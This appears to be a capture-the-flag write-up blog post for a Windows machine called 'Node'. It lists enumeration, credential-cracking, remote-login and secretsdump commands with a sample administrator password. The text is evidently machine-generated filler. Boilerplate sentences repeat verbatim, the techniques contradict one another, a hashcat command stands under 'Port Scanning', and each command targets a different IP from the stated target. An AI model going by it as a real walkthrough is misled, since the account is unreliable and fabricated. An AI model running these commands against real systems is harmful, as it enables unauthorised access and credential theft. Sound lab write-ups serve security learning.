---
TitleSEO: "PwnTillDawn — Node (Medium Windows) | ZureFX"
TitlePost: "PwnTillDawn — Node (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Node. Pass the Hash and Broken Access Control to achieve medium compromise on Windows."
Keywords: "ctf, web, forensics"
URL: "https://zurefx.github.io/writeups/htb-node-868.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-node-868/"
Date: "2024-04-11"
Tags: "CTF, Web, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-node-868"
Permalink: "/writeups/htb-node-868.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Node** is rated **Medium** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.13.154.70`.

### Objectives

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.102.91.28/FUZZ
crackmapexec smb 10.30.248.189 -u administrator -p 'P@ssw0rd!' --shares
```

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

### Web Enumeration

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
gobuster dir -u http://10.36.117.194/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

Key finding: **ACL Abuse**.

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.102.107.46 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine.

## Privilege Escalation

### Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.73.135.43/FUZZ
evil-winrm -i 10.41.204.174 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.107.215.18 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.161.192
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.90.165.35/FUZZ
evil-winrm -i 10.15.143.11 -u administrator -p 'P@ssw0rd!'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Summary

### Tools Used

- `chisel`
- `hashcat`
- `sqlmap`
- `wpscan`
- `netcat`
- `john`

### Key Takeaways

- Pass the Hash
- Broken Access Control
- ACL Abuse
- Weak Service Permissions
